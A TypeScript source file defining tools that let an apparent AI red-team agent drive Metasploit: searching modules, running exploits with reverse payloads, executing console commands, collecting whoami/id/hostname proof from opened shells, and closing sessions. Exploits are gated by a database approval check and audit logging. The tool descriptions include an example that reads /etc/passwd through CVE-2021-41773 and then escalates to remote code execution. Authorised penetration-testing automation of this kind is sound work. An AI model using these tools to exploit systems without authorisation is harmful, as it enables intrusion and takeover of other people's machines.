import { FunctionTool } from '@google/adk'
import { z } from 'zod/v4'
import { msfStart, msfRun, msfClose, kesGetLhost } from '../../shared/kes-client.js'
import { createLogger } from '../../shared/logger.js'
import { db } from '../../shared/db-client.js'
import { resolvePortProtocol } from '../lib/port-protocol.js'
import { validateMsfModule } from '../lib/msf-validator.js'

const logger = createLogger('red_team_agent')

/**
 * Managed MSF console sessions keyed by campaign-ish ID.
 * Allows reuse across multiple tool calls within the same agent turn.
 */
const _activeSessions = new Map<string, { id: string; lastAccessed: number; lock: Mutex }>()
const SESSION_TTL_MS = 30 * 60 * 1000 // 30 min auto-cleanup

class Mutex {
  private mutex = Promise.resolve();
  lock(): Promise<() => void> {
    let begin: (unlock: () => void) => void;
    this.mutex = this.mutex.then(() => new Promise(begin));
    return new Promise(res => begin = res);
  }
}

function _cleanStaleSessions() {
  const now = Date.now()
  for (const [key, val] of _activeSessions) {
    if (now - val.lastAccessed > SESSION_TTL_MS) {
      msfClose(val.id).catch(() => {})
      _activeSessions.delete(key)
    }
  }
}

async function safeMsfRun(sessionId: string, command: string, customPrompt?: string, timeout?: number) {
  let lock: Mutex | undefined
  for (const val of _activeSessions.values()) {
    if (val.id === sessionId) {
      lock = val.lock
      val.lastAccessed = Date.now()
    }
  }
  if (!lock) return msfRun(sessionId, command, customPrompt, timeout)
  
  const unlock = await lock.lock()
  try {
    return await msfRun(sessionId, command, customPrompt, timeout)
  } finally {
    unlock()
  }
}

const _pendingSessions = new Map<string, Promise<string>>()

async function _getOrCreateSession(tag = 'default'): Promise<string> {
  _cleanStaleSessions()
  const existing = _activeSessions.get(tag)
  if (existing) {
    existing.lastAccessed = Date.now()
    return existing.id
  }

  // Prevent multiple concurrent tool calls from spawning multiple msfconsole instances for the same tag
  if (_pendingSessions.has(tag)) {
    return _pendingSessions.get(tag)!
  }

  const creationPromise = msfStart().then(id => {
    _activeSessions.set(tag, { id, lastAccessed: Date.now(), lock: new Mutex() })
    _pendingSessions.delete(tag)
    return id
  }).catch(err => {
    _pendingSessions.delete(tag)
    throw err
  })

  _pendingSessions.set(tag, creationPromise)
  return creationPromise
}

// ─────────────────────────────────────────────────────────────────
// Tool 1: msf_search — Native MSF search within msfconsole
// ─────────────────────────────────────────────────────────────────

export const msfSearchTool = new FunctionTool({
  name: 'msf_search',
  description: `Search for Metasploit modules inside msfconsole using the native 'search' command.
Returns the raw search results table. You can then use 'use <index>' via run_msf_command.
Examples:
  query: "type:exploit name:vsftpd"
  query: "cve:2021-41773"
  query: "type:exploit platform:linux smb"
  query: "eternalblue"`,
  parameters: z.object({
    query: z.string().describe("MSF search query, e.g. 'cve:2021-41773' or 'type:exploit platform:linux smb'"),
    campaignId: z.string().optional().describe('Campaign UUID from your task prompt. Copy it exactly — never invent one.'),
  }),
  execute: async ({ query, campaignId }) => {
    const start = Date.now()
    let sessionId = await _getOrCreateSession(campaignId ?? 'default')
    let result = await safeMsfRun(sessionId, `search ${query}`, undefined, 120)

    if (!result.success && (result.error?.includes('404') || result.error?.includes('410'))) {
      sessionId = await _getOrCreateSession('force_new_recovery_' + Date.now())
      _activeSessions.set(campaignId ?? 'default', { id: sessionId, lastAccessed: Date.now(), lock: new Mutex() })
      result = await safeMsfRun(sessionId, `search ${query}`, undefined, 120)
    }

    await logger.audit(
      'msf_search',
      { query },
      { output: result.output, success: result.success },
      Date.now() - start,
      campaignId,
    )

    return {
      output: result.output,
      success: result.success,
      sessionId,
      hint: 'Use run_msf_command with "use <index_number>" to select a module, then "info" to see options.',
    }
  },
})

// ─────────────────────────────────────────────────────────────────
// Tool 2: run_exploit — Full exploit lifecycle
// ─────────────────────────────────────────────────────────────────

export const runExploitTool = new FunctionTool({
  name: 'run_exploit',
  description: `Run a Metasploit exploit end-to-end. Manages the MSF session, sets options,
executes the exploit synchronously, polls for opened sessions, and gathers proof.

LHOST is auto-detected from the Kali container's network interface — you do NOT need to set it
unless you have a specific reason (e.g. pivoting). Not every module needs LHOST — bind payloads
and interactive payloads do not.

IMPORTANT CRITICAL RULES:
1. ALWAYS run 'msf_search' first to find the correct module path.
2. DO NOT GUESS THE PAYLOAD. Omit the payload parameter completely to allow Metasploit to use the default compatible payload. If you must set a payload, you MUST verify it exists first by running "show payloads" in run_msf_command.
3. If an exploit fails, run 'show targets' using run_msf_command to see if the target index needs to be adjusted.
4. If a target is using SSL/TLS, but msfconsole is ignoring it, you can explicitly set options using {"SSL": "true"} or {"SSL": "false"} as needed.
5. If the target is not exploitable but SSL errors appeared, double check your SSL settings!`,
  parameters: z.object({
    module: z.string().describe("Full module path, e.g. 'exploit/unix/ftp/vsftpd_234_backdoor'"),
    rhosts: z.string().optional().describe('Target IP address (RHOSTS)'),
    target: z.string().optional().describe('Target index or name, e.g. "0" or "1" (check show targets first!).'),
    port: z.number().optional().describe('Target port (if applicable to module). Used to auto-detect SSL — always provide this.'),
    nmapTags: z.array(z.string()).optional().describe('nmap service tags for the port, e.g. ["ssl","http"]. Improves SSL auto-detection.'),
    targetOS: z.string().optional().describe('OS from nmap OS detection, e.g. "Linux 4.15" or "Windows Server 2016". Used to validate platform compatibility.'),
    payload: z.string().optional().describe("Payload string. CRITICAL: Leave empty to use default! NEVER guess this!"),
    options: z.record(z.string(), z.string()).optional().describe('Additional MSF options as key-value, e.g. {"TARGETURI": "/cgi-bin"}'),
    lhost: z.string().optional().describe('Override auto-detected LHOST for reverse payloads. Leave empty for auto-detect.'),
    lport: z.number().optional().describe('Listener port for reverse payloads (default 4444)'),
    skipLhost: z.boolean().optional().describe('Set true for bind/interactive payloads that do NOT need LHOST (e.g. cmd/unix/interact)'),
    campaignId: z.string().optional().describe('Campaign UUID from your task prompt. Copy it exactly — never invent one.'),
    approvalId: z.string().describe('The UUID of an APPROVED request returned by request_approval(). This is strictly required for exploits. Call request_approval first.'),
  }),
  execute: async ({ module, rhosts, target, port, nmapTags, targetOS, payload, options, lhost, lport, skipLhost, campaignId, approvalId }) => {
    if (!approvalId) {
      return { error: 'Access Denied: You MUST provide an approvalId from a successful request_approval() call before running an exploit.' }
    }
    const row = await db.query('SELECT status FROM approval_requests WHERE id = $1', [approvalId])
    if (row.rows[0]?.status !== 'approved') {
      return { error: `Access Denied: approvalId ${approvalId} is not approved or is invalid. Call request_approval() and wait for approval.` }
    }

    // ── Pre-flight: validate module before spending 180s on a doomed exploit ──
    const validation = validateMsfModule(
      module,
      port,
      targetOS,
      nmapTags ?? [],
      payload,
      options ?? {},
    )
    if (!validation.valid) {
      return {
        error: 'Module validation failed — fix the following before exploiting:',
        validationErrors: validation.errors,
        validationWarnings: validation.warnings,
        suggestions: validation.suggestions,
      }
    }

    const start = Date.now()
    let sessionId = await _getOrCreateSession(campaignId ?? 'default')

    // ── Auto-detect SSL setting from port + nmap tags ──────────────────────
    // This prevents the common mistake of running SSL=true on port 80 or SSL=false on port 443.
    const mergedOptions: Record<string, string> = { ...(options ?? {}) }
    if (port !== undefined) {
      const proto = resolvePortProtocol(port, nmapTags ?? [])
      // Only auto-set SSL if the module deals with HTTP and the caller hasn't overridden it
      const isHttpModule = module.toLowerCase().includes('http') || module.toLowerCase().includes('web')
      const callerSetSSL = 'SSL' in mergedOptions || 'ssl' in mergedOptions
      if (isHttpModule && !callerSetSSL && proto.msfSSLOption !== null) {
        mergedOptions['SSL'] = proto.msfSSLOption ? 'true' : 'false'
      }
    }

    // ── Build command sequence ──
    const commands: string[] = [
      `use ${module}`
    ]
    if (rhosts) commands.push(`set RHOSTS ${rhosts}`)
    if (target) commands.push(`set TARGET ${target}`)
    if (port !== undefined && port !== null) commands.push(`set RPORT ${port}`)

    // Payload
    if (payload) {
      commands.push(`set PAYLOAD ${payload}`)
    }

    // LHOST — only for reverse payloads
    const needsLhost = !skipLhost && (
      !payload ||
      payload.includes('reverse') ||
      payload.includes('meterpreter')
    )

    if (needsLhost) {
      const resolvedLhost = lhost ?? await kesGetLhost()
      if (resolvedLhost) {
        commands.push(`set LHOST ${resolvedLhost}`)
        commands.push(`set LPORT ${lport ?? 4444}`)
      }
    }

    // Extra options (including auto-set SSL)
    for (const [k, v] of Object.entries(mergedOptions)) {
      commands.push(`set ${k} ${v}`)
    }

    // Show options for audit visibility
    commands.push('show options')

    // Synchronous exploit with auto-background (-z)
    commands.push('exploit -z')

    // ── Execute command sequence ──
    let allOutput = ''
    let lastSuccess = true
    for (let i = 0; i < commands.length; i++) {
      const cmd = commands[i]
      let result = await safeMsfRun(
        sessionId,
        cmd,
        undefined,
        cmd.startsWith('exploit') ? 180 : undefined,
      )

      if (!result.success && (result.error?.includes('404') || result.error?.includes('410'))) {
        sessionId = await _getOrCreateSession('force_new_recovery_' + Date.now())
        _activeSessions.set(campaignId ?? 'default', { id: sessionId, lastAccessed: Date.now(), lock: new Mutex() })
        result = await safeMsfRun(sessionId, cmd, undefined, cmd.startsWith('exploit') ? 180 : undefined)
      }

      allOutput += `\n┌─ ${cmd}\n${result.output}\n`
      if (!result.success) {
        lastSuccess = false
        allOutput += `\n[ERROR] ${result.error ?? 'Command failed'}\n`
        // Don't break on show options, check, or non-critical failures
        if (cmd.startsWith('exploit')) break
      }
      
      // Look for specific error outputs that mean the exploit failed cleanly
      if (cmd.startsWith('exploit') && result.output.includes('Exploit aborted due to failure')) {
         lastSuccess = false
         break
      }
    }

    // ── Post-exploit: check for opened sessions ──
    await new Promise(r => setTimeout(r, 3000)) // small grace period
    const sessionsResult = await safeMsfRun(sessionId, 'sessions -l')
    allOutput += `\n┌─ sessions -l\n${sessionsResult.output}\n`

    // Parse sessions table for active sessions.
    // MSF formats observed:
    //   "  1  shell  unix  ..."              (basic shell)
    //   "  2  shell cmd/unix  ..."           (cmd shell — old regex missed this)
    //   "  3  meterpreter x64/linux  ..."    (meterpreter)
    //   "  4  meterpreter x86/windows  ..."
    // We match any line starting with a session number followed by shell or meterpreter.
    const sessionLines = sessionsResult.output.split('\n')
    const activeSessionIds: string[] = []
    for (const line of sessionLines) {
      const match = line.match(/^\s*(\d+)\s+(shell|meterpreter)/)
      if (match) activeSessionIds.push(match[1])
    }

    // Also check for auxiliary module success (no session but "[+]" output = finding)
    const auxiliarySuccess =
      !activeSessionIds.length &&
      (sessionsResult.output.includes('[+]') || allOutput.includes('[+]'))

    const sessionOpened = activeSessionIds.length > 0

    // ── Gather proof if session opened ──
    let proof = ''
    if (sessionOpened) {
      const sid = activeSessionIds[activeSessionIds.length - 1] // newest session
      // Use sessions -c to run proof commands non-interactively — avoids PTY prompt switching
      // that breaks msfRun when using sessions -i
      for (const pcmd of ['whoami', 'id', 'hostname']) {
        try {
          const pr = await safeMsfRun(sessionId, `sessions -c ${JSON.stringify(pcmd)} -i ${sid}`, undefined, 15)
          proof += `${pcmd}: ${pr.output}\n`
        } catch {
          // Some commands may fail in certain session types
        }
      }
    }

    // ── Audit log with FULL output (user requested) ──
    await logger.audit(
      'run_exploit',
      { module, target, port, payload, options: mergedOptions },
      {
        sessionOpened,
        auxiliarySuccess,
        activeSessionIds,
        proof: proof || undefined,
        output: allOutput,
        validationWarnings: validation.warnings,
      },
      Date.now() - start,
      campaignId,
    )

    // Truncate output sent to agent — full output in audit log
    const MAX_OUT = 3000
    const outputForAgent = allOutput.length > MAX_OUT
      ? allOutput.slice(0, MAX_OUT) + `\n...[truncated — see audit log for full output]`
      : allOutput

    return {
      success: lastSuccess || auxiliarySuccess,
      sessionOpened,
      auxiliarySuccess,
      activeSessionIds,
      proof: proof || undefined,
      output: outputForAgent,
      msfSessionId: sessionId,
      validationWarnings: validation.warnings.length > 0 ? validation.warnings : undefined,
    }
  },
})

// ─────────────────────────────────────────────────────────────────
// Tool 3: run_msf_command — Interactive MSF command
// ─────────────────────────────────────────────────────────────────

export const runMsfCommandTool = new FunctionTool({
  name: 'run_msf_command',
  description: `Send a command to a persistent msfconsole session.
Use this for interactive workflows:
  - "search type:exploit platform:linux <keyword>"  → find modules
  - "use 0"                                          → select module by index
  - "info"                                           → read module options & description
  - "show targets"                                   → list valid TARGET options
  - "show payloads"                                  → list compatible payloads for the chosen target
  - "show options"                                   → see current settings
  - "sessions -l"                                    → list opened sessions
  - "sessions -i 1"                                  → interact with session 1

AUXILIARY MODULE RULE — CRITICAL:
Auxiliary modules (paths starting with auxiliary/) use run_msf_command("run"), NOT run_exploit().
run_exploit() is ONLY for exploit/* paths. Using it on auxiliary/* always fails silently.
Example — CVE-2021-41773 file read (no CGI/shell needed):
  run_msf_command("use auxiliary/scanner/http/apache_normalize_path")
  run_msf_command("set RHOSTS 172.18.0.8")
  run_msf_command("set ACTION READ_FILE")
  run_msf_command("set FILEPATH /etc/passwd")
  run_msf_command("run")
If this returns /etc/passwd contents → vulnerability confirmed → escalate to RCE exploit.

A single session is automatically managed for your campaign.`,
  parameters: z.object({
    command: z.string().describe('MSF command to execute'),
    timeout: z.number().optional().describe('Command timeout in seconds (default 120)'),
    campaignId: z.string().optional().describe('Campaign UUID from your task prompt. Copy it exactly — never invent one.'),
  }),
  execute: async ({ command, timeout, campaignId }) => {
    let finalCommand = command.trim()
    
    // Enforce one persistent msf session per campaign. Automatically recovers if backend was restarted.
    let sid = await _getOrCreateSession(campaignId ?? 'default')
    
    // Split on newlines if the agent sends multiple commands at once
    const cmds = finalCommand.split('\n').map(c => c.trim()).filter(c => c.length > 0)
    let allOutput = ''
    let lastSuccess = true
    let lastError: string | undefined
    
    for (let cmd of cmds) {
      if (cmd.startsWith('cve:') || cmd.startsWith('type:')) {
        cmd = `search ${cmd}`
      }
      
      let result = await safeMsfRun(sid, cmd, undefined, timeout)
      
      // Auto-heal if Kali service dropped the session (e.g. backend restart, msfconsole OOM)
      if (!result.success && (result.error?.includes('404') || result.error?.includes('410'))) {
        sid = await _getOrCreateSession('force_new_recovery_' + Date.now())
        _activeSessions.set(campaignId ?? 'default', { id: sid, lastAccessed: Date.now(), lock: new Mutex() })
        result = await safeMsfRun(sid, cmd, undefined, timeout)
      }

      allOutput += (allOutput ? '\n' : '') + result.output
      lastSuccess = result.success
      if (!result.success) {
        lastError = result.error
        break
      }
    }

    await logger.audit(
      'run_msf_command',
      { command: finalCommand },
      { output: allOutput, success: lastSuccess },
      0,
      campaignId,
    )

    return {
      output: allOutput,
      success: lastSuccess,
      error: lastError,
      sessionId: sid,
    }
  },
})

// ─────────────────────────────────────────────────────────────────
// Tool 4: msf_session_cleanup — Close MSF console session
// ─────────────────────────────────────────────────────────────────

export const msfCleanupTool = new FunctionTool({
  name: 'msf_session_cleanup',
  description: 'Close a persistent msfconsole session when you are done with exploitation. Call this after all exploits and post-exploitation are complete.',
  parameters: z.object({
    campaignId: z.string().optional().describe('Campaign ID whose session to close'),
  }),
  execute: async ({ campaignId }) => {
    const tag = campaignId ?? 'default'

    const existing = _activeSessions.get(tag)
    if (existing) {
      await msfClose(existing.id).catch(() => {})
      _activeSessions.delete(tag)
      return { closed: true, sessionId: existing.id }
    }

    return { closed: false, message: 'No active session found for this campaign' }
  },
})
